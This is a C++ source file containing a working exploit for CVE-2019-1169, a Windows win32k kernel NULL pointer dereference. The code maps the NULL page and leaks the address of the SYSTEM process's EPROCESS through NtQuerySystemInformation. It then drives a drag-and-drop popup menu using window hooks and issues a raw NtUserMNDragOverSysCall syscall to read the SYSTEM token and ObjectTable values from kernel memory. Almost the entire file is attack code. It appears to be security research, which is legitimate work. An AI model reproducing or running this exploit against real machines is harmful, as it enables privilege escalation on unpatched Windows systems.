// WindowsProject-CVE-2019-1169.cpp : Defines the entry point for the application.
//
#include <stdio.h>
#include <Windows.h>
#include <bcrypt.h> // Needed to solve issue "Function returning function is not allowed". 
					// Don't know why this works but I've imported it for other projects and it seemed to solve this error.

#define MAX_LOADSTRING 100
#define FNID_MENU 0x29C // Taken from https://media.paloaltonetworks.com/lp/endpoint-security/blog/the-case-for-smep-exploiting-a-kernel-vulnerability.html and confirmed by reversing xxxMenuWindowProc.
#define STATUS_SUCCESS 0x0 // Cause this is the only NTSTATUS definition we really need, I'd rather not import NTSTATUS.h and just do this instead.

// Following two structure definitions taken from https://processhacker.sourceforge.io/doc/ntexapi_8h_source.html
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
	PVOID Object;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
    ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

// Taken from https://github.com/conix-security/zer0m0n/blob/master/src/driver/include/nt/structures/SYSTEM_INFORMATION_CLASS.h
// More specific information can be found at https://processhacker.sourceforge.io/doc/ntexapi_8h_source.html
typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemBasicInformation = 0,
	SystemProcessorInformation = 1,             // obsolete...delete
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemPathInformation = 4,
	SystemProcessInformation = 5,
	SystemCallCountInformation = 6,
	SystemDeviceInformation = 7,
	SystemProcessorPerformanceInformation = 8,
	SystemFlagsInformation = 9,
	SystemCallTimeInformation = 10,
	SystemModuleInformation = 11,
	SystemLocksInformation = 12,
	SystemStackTraceInformation = 13,
	SystemPagedPoolInformation = 14,
	SystemNonPagedPoolInformation = 15,
	SystemHandleInformation = 16,
	SystemObjectInformation = 17,
	SystemPageFileInformation = 18,
	SystemVdmInstemulInformation = 19,
	SystemVdmBopInformation = 20,
	SystemFileCacheInformation = 21,
	SystemPoolTagInformation = 22,
	SystemInterruptInformation = 23,
	SystemDpcBehaviorInformation = 24,
	SystemFullMemoryInformation = 25,
	SystemLoadGdiDriverInformation = 26,
	SystemUnloadGdiDriverInformation = 27,
	SystemTimeAdjustmentInformation = 28,
	SystemSummaryMemoryInformation = 29,
	SystemMirrorMemoryInformation = 30,
	SystemPerformanceTraceInformation = 31,
	SystemObsolete0 = 32,
	SystemExceptionInformation = 33,
	SystemCrashDumpStateInformation = 34,
	SystemKernelDebuggerInformation = 35,
	SystemContextSwitchInformation = 36,
	SystemRegistryQuotaInformation = 37,
	SystemExtendServiceTableInformation = 38,
	SystemPrioritySeperation = 39,
	SystemVerifierAddDriverInformation = 40,
	SystemVerifierRemoveDriverInformation = 41,
	SystemProcessorIdleInformation = 42,
	SystemLegacyDriverInformation = 43,
	SystemCurrentTimeZoneInformation = 44,
	SystemLookasideInformation = 45,
	SystemTimeSlipNotification = 46,
	SystemSessionCreate = 47,
	SystemSessionDetach = 48,
	SystemSessionInformation = 49,
	SystemRangeStartInformation = 50,
	SystemVerifierInformation = 51,
	SystemVerifierThunkExtend = 52,
	SystemSessionProcessInformation = 53,
	SystemLoadGdiDriverInSystemSpace = 54,
	SystemNumaProcessorMap = 55,
	SystemPrefetcherInformation = 56,
	SystemExtendedProcessInformation = 57,
	SystemRecommendedSharedDataAlignment = 58,
	SystemComPlusPackage = 59,
	SystemNumaAvailableMemory = 60,
	SystemProcessorPowerInformation = 61,
	SystemEmulationBasicInformation = 62,
	SystemEmulationProcessorInformation = 63,
	SystemExtendedHandleInformation = 64,
	SystemLostDelayedWriteInformation = 65,
	SystemBigPoolInformation = 66,
	SystemSessionPoolTagInformation = 67,
	SystemSessionMappedViewInformation = 68,
	SystemHotpatchInformation = 69,
	SystemObjectSecurityMode = 70,
	SystemWatchdogTimerHandler = 71,
	SystemWatchdogTimerInformation = 72,
	SystemLogicalProcessorInformation = 73,
	SystemWow64SharedInformation = 74,
	SystemRegisterFirmwareTableInformationHandler = 75,
	SystemFirmwareTableInformation = 76,
	SystemModuleInformationEx = 77,
	SystemVerifierTriageInformation = 78,
	SystemSuperfetchInformation = 79,
	SystemMemoryListInformation = 80,
	SystemFileCacheInformationEx = 81,
	MaxSystemInfoClass = 82  // MaxSystemInfoClass should always be the last enum

} SYSTEM_INFORMATION_CLASS;

// Define function definitions for undocumented and/or unexported functions.
typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect); // Definition taken from https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntifs/nf-ntifs-ntallocatevirtualmemory
typedef NTSTATUS(WINAPI* NtQuerySystemInformation)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID                   SystemInformation,
	IN ULONG                    SystemInformationLength,
	OUT PULONG                  ReturnLength);  // Taken from https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation

// Global Variables:
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name

HWND hWnd;            // Main window
HMENU popupMenu;     // Popup menu

HANDLE gdi32ModuleHandle; // Handle to gdi32.dll

// Save a handle to the current module since we will be using this a lot.
HINSTANCE currentEXEModuleHandle = GetModuleHandleA(NULL);

// Set up a pointer to the NtQuerySystemInformation function in memory and set it to NULL to initialize it.
NtQuerySystemInformation pfNtQuerySystemInformation = NULL;

// Define undocumented Window messages. Some info taken from https://github.com/quangnh89/WinEoP/blob/master/src/WinEoP/Utils/winapi.h for
// corresponding functions related to certain Window messages, most taken from the following link which describes the full list of Window messages and their names:
// https://www.gamedev.net/forums/topic/552982-list-of-windows-messages-with-their-description-wm_/
#define MN_FINDWINDOWFROMPOINT     0x01E8 // xxxMNFindWindowFromPoint
#define MN_SELECTITEM              0x01E5 // xxxMNSelectItem
#define MN_SETTIMERTOOPENHIERARCHY 0x01F0 // MNSetTimerToOpenHierarchy


POINT ppt; // Point structure
int ppi[1000]; // Output buffer for NtUserMNDragOverSysCall

int countPopupCreationEventHandlerHit = 0; // Number of times the event handler for popup creation has been hit.

// Forward declarations of functions included in this code module:
BOOL InitInstance(HINSTANCE, int);


// Tips for inline assembly taken from https://docs.microsoft.com/en-us/cpp/assembler/inline/inline-assembler-overview?view=vs-2019
// Information about syscalls taken from https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=9&cad=rja&uact=8&ved=2ahUKEwj33eyjtbXkAhVCF6wKHRYABe0QFjAIegQIPBAC&url=https%3A%2F%2Fwww.cs.montana.edu%2Fcourses%2Fspring2005%2F518%2FHypertextbook%2Fvijay%2Fproject.ppt&usg=AOvVaw3i3v2RWmWPQmcjb-qIaCq4
// on slide 63, as well as https://www.codemachine.com/article_syscall.html

// Also thanks to https://docs.microsoft.com/en-us/cpp/assembler/inline/writing-functions-with-inline-assembly?view=vs-2019 for showing how you can reference local variables from inline assembly.
int NtUserMNDragOverSysCall(POINT* ppt, OUT LPVOID ppi) {
	_asm {
		mov eax, 0x11ED
		push ppi
		push ppt
		mov edx, esp
		int 0x2E
		pop eax
		pop eax
	}
}

// Function to allocate the NULL page of memory for the NULL pointer dereference
// and fill its contents with the appropriate information for the exploit to perform correctly.
// Some info on how VirtualAlloc() doesn't allow you to allocate the NULL page and the reasons why NtVirtualAlloc() works instead is briefly mentioned at
// at https://blog.didierstevens.com/2011/03/14/heaplocker-null-page-allocation/. A more complete discussion involving the tracing of data through the 
// various backend functions can be found in French (sorry but I don't believe that there is a direct English translation) at http://www.ivanlef0u.tuxfamily.org/?p=355
//
// Code was taken somewhat from https://www.fuzzysecurity.com/tutorials/expDev/16.html
BOOL allocateAndFillNullAlignedMemoryPage() {
	pfNtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (pfNtQuerySystemInformation == NULL) {
		printf("[!] Was unable to obtain the address of NtQuerySystemInformation() from ntdll.dll. Exiting...\r\n");
		return FALSE;
	}
	else {
		printf("[*] Successfully obtained the address of NtQuerySystemInformation()\r\n");
	}


	// The strategy we will use here to get the EPROCESS address of the SYSTEM process using NtQuerySystemInformation is discussed at http://blog.rewolf.pl/blog/?p=1683
	SYSTEM_HANDLE_INFORMATION_EX* informationStorage = (SYSTEM_HANDLE_INFORMATION_EX*)malloc(sizeof(SYSTEM_HANDLE_INFORMATION_EX)); // Allocate space for structure where results will be returned.
	ULONG returnLength = 0; // Bytes returned from call to NtQuerySystemInformation
	pfNtQuerySystemInformation(SystemExtendedHandleInformation, informationStorage, sizeof(SYSTEM_HANDLE_INFORMATION_EX), &returnLength);

	if (returnLength <= 10) {
		printf("[!] No results returned from pfNtQuerySystemInformation, call failed. Exiting...\r\n");
		return FALSE;
	}

	DWORD addressOfSystemEPROCESS = NULL;

	for (int i = 0; i < informationStorage->NumberOfHandles; i++) {
		if (informationStorage->Handles[i].UniqueProcessId == 4) {
			addressOfSystemEPROCESS = (DWORD)(informationStorage->Handles[i].Object);
			break;
		}
	}

	if (addressOfSystemEPROCESS == NULL) {
		printf("[!] Was not able to obtain the address of the SYSTEM process's EPROCESS structure.\r\n");
	}
	else {
		printf("[*] NtQuerySystemInformation() leak succeeded!\r\n");
		printf("[*] Address of the EPROCESS structure for the SYSTEM process: 0x%08x\r\n", addressOfSystemEPROCESS);
	}

	DWORD addressOfTokenFieldInSystemEPROCESS = addressOfSystemEPROCESS + 0xF8; // In x86, TOKEN field is at offset 0xF8 of EPROCESS.
	DWORD addressOfObjectTableFieldInSystemEPROCESS = addressOfSystemEPROCESS + 0xF4; // In x86 the ObjectTable field is at offset 0xF4 of EPROCESS.
	

	NtAllocateVirtualMemory pNtAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtAllocateVirtualMemory"); // Get the address of NtAllocateVirtualMemory which is exported from ntdll.dll
	DWORD baseAddress = 0x1;
	SIZE_T sizeOfAllocation = 1024;
	NTSTATUS result = pNtAllocateVirtualMemory(GetCurrentProcess(), (PVOID*)&baseAddress, 0, &sizeOfAllocation, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (result == STATUS_SUCCESS) {
		printf("[*] Successfully allocated the NULL page!\r\n");
		memcpy((void*)0x14, (void*)&addressOfObjectTableFieldInSystemEPROCESS, 4);
		memcpy((void*)0x4, (void*)&addressOfTokenFieldInSystemEPROCESS, 4);
		return TRUE;
	}
	else {
		printf("[!] Could not allocate the NULL page...\r\n");
		return FALSE;
	}
}

LRESULT CALLBACK WindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
{
	tagCWPSTRUCT* cwp = (tagCWPSTRUCT*)lParam;
	//printf("[*] Message: 0x%04x\r\n", cwp->message); // Uncomment this to get info about the Window messages which are being sent. This is noisy but helpful for debugging issues.
	if (cwp->message == MN_SELECTITEM) {
		if (allocateAndFillNullAlignedMemoryPage() == TRUE) { // If the null page was allocated successfully...
			DestroyWindow(cwp->hwnd); // Destroy the main window thereby making ppopupmenu in the tagMENUWND structure NULL.
		}
		else {
			ExitProcess(-1); // Otherwise just exit the process; something has gone seriously wrong and we can't exploit the bug.
		}
	}
	return CallNextHookEx(NULL, code, wParam, lParam);
}


// Event hook which will be hit when a popup menu is spawned. Created based on code 
// shown at https://xiaodaozhi.com/exploit/117.html along with some MSDN documentation.
void CALLBACK popupMenuSpawnedEventHookProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime) {

	if (countPopupCreationEventHandlerHit == 0) {
		printf("[*] Sending window message to press the left mouse button down...\r\n");
		SendMessageW(hwnd, WM_LBUTTONDOWN, 0, 0x00100000); // More documentation on this window message can be found at https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-lbuttondown
	}
	countPopupCreationEventHandlerHit++; // Increment the counter for the number of times popupMenuSpawnedEventHookProc()
										 // has been executed so that it is up to date.
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	hInst = hInstance; // Store instance handle in our global variable

	hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
		0, 0, CW_USEDEFAULT, CW_USEDEFAULT, nullptr, nullptr, hInstance, nullptr); // Create the application's main window.

	if (!hWnd) // Check if CreateWindowW() succeeded or not and exit if there was a failure.
	{
		printf("[!] Could not successfully create the main window. Exiting...\r\n");
		return FALSE;
	}
	else {
		printf("[*] Successfully created the main window.\r\n");
	}
	

	printf("[*] Creating popup menu and appending it to the main window...\r\n");
	// Create the popup menu.
	popupMenu = CreatePopupMenu();

	// Set it as the primary popup menu for the application's main window.
	AppendMenu(popupMenu, MF_POPUP, (UINT_PTR)NULL, L"ThePopup");


	// As was discussed in https://xiaodaozhi.com/exploit/117.html under the section "Major Function of Proof Code", its possible
	// to make a menu drag and drop enabled simply by calling SetMenuInfo(). This is also documented in MSDN somewhat when you 
	// look at the MENUINFO structure that is passed as the second argument to SetMenuInfo(), as is explained in more detail at 
	// https://docs.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-menuinfo. In particular the MNS_DRAGDROP option,
	// which states "Menu items are OLE drop targets or drag sources", is of interest to us here.

	// Set up the MENUINFO structure first...
	MENUINFO menuInfo = { 0 };
	menuInfo.cbSize = sizeof(menuInfo);
	menuInfo.fMask = MIM_STYLE; // Set to MIM_STYLE as we specifically want to set the dwStyle member.
	menuInfo.dwStyle = MNS_AUTODISMISS | MNS_MODELESS | MNS_DRAGDROP; // Just using values from https://xiaodaozhi.com/exploit/117.html here, the MNS_DRAGDROP one is what matters most.

	// Then set the menu info for the popup menu...
	if ((SetMenuInfo(popupMenu, &menuInfo) != FALSE)){
		printf("[*] Set the popup menu to be drag and drop enabled.\r\n");
	}
	else {
		printf("[!] Could not set the popup menu to be drag and drop enabled...\r\n");
		return FALSE;
	}

	printf("[*] Setting up the Windows event hook...\r\n");

	// Set up the hook for when the popup menu is created.
	if (SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART, hInst, popupMenuSpawnedEventHookProc, GetCurrentProcessId(), GetCurrentThreadId(), 0) == 0) {
		printf("[!] Was not able to set the Windows event hook...\r\n");
		return FALSE;
	}
	
	printf("[*] Setting up the Windows message hook...\r\n");

	// Set up the hook for Window Messages
	if (SetWindowsHookEx(WH_CALLWNDPROC, WindowHookProc, hInst, GetCurrentThreadId()) == NULL) {
		printf("[!] Was not able to set the Windows message hook. Error was: %d\r\n", GetLastError());
		return FALSE;
	}

	// Finally show the main window.
	ShowWindow(hWnd, nCmdShow);

	// This part will update the window which will cause the paint operation to occur, 
	// thereby filling in the main background of the app with the color specified at wcex.hbrBackground.
	UpdateWindow(hWnd);

	// Call TrackPopupMenuEx() to display popupMenu within the application. Page 458 and 459 of Programming Windows 
	// 5th Edition by Charles Petzold explain this in more detail.
	printf("[*] Displaying the popup menu with TrackPopupMenuEx()\r\n");
	TrackPopupMenuEx(popupMenu, TPM_LEFTALIGN | TPM_TOPALIGN | TPM_LEFTBUTTON | TPM_HORIZONTAL, 0, 30, hWnd, NULL);
	return TRUE;
}

int main(int argc, char* argv[]) {

	printf("CVE-2019-1169 Exploit by Grant Willcox (@tekwizz123)\r\n");
	printf("----------------------------------------------------\r\n\r\n");

	gdi32ModuleHandle = LoadLibraryA("gdi32.dll"); // Load gdi32.dll so that we can make syscalls to win32k.sys

	// Initialize global strings
	memcpy_s(szTitle, 100, L"The Title", sizeof(L"The Title"));
	memcpy_s(szWindowClass, 100, L"WindowClass", sizeof(L"WindowClass"));

	// Set the drag and drop points so they appear to be dragging and dropping onto our Window but at some later location.
	ppt.x = 50;
	ppt.y = 50;


	// Register the window class for the main application window.
	WNDCLASSEXW wcex = { 0 };

	wcex.cbSize = sizeof(WNDCLASSEX);
	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = DefWindowProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = currentEXEModuleHandle;
	wcex.hIcon = NULL;
	wcex.hCursor = NULL;
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW);
	wcex.lpszMenuName = NULL;
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = NULL;

	if (RegisterClassExW(&wcex) == 0) {
		printf("[!] RegisterClassExW failed, error was: %d\r\n", GetLastError());
	}
	else {
		printf("[*] RegisterClassExW succeeded!\r\n");
	}

	// Perform application initialization.
	// Cause HMODULE is the same as HINSTANCE these days (see https://devblogs.microsoft.com/oldnewthing/20040614-00/?p=38903),
	// we can use GetModuleHandle() with a NULL parameter to get the handle 
	// to the current running instance of this EXE, as was done in the earlier global definition of currentEXEModuleHandle.
	if (!InitInstance(currentEXEModuleHandle, 1))
	{
		return FALSE;
	}

	MSG msg;
	// Main message loop:
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);

		// If we have left clicked and dragged an item, then we should now be ready to trigger the vulnerability
		// as we have the environment set up in a drag and drop state with backing structures set up as needed.
		if (countPopupCreationEventHandlerHit == 1) {
			printf("[*] Making the syscall!\r\n");
			NtUserMNDragOverSysCall(&ppt, ppi);
			printf("[*] SYSTEM Process's ObjectTable field has a value of: 0x%08x\r\n", ppi[1]);
			printf("[*] SYSTEM Process's Token field has a value of: 0x%08x\r\n", ppi[3]);
			printf("[*] SYSTEM Process's Token field actual address is: 0x%08x\r\n", (ppi[3] & 0xFFFFFFF8));
			ExitProcess(2);
		}
	}

	return 0;
}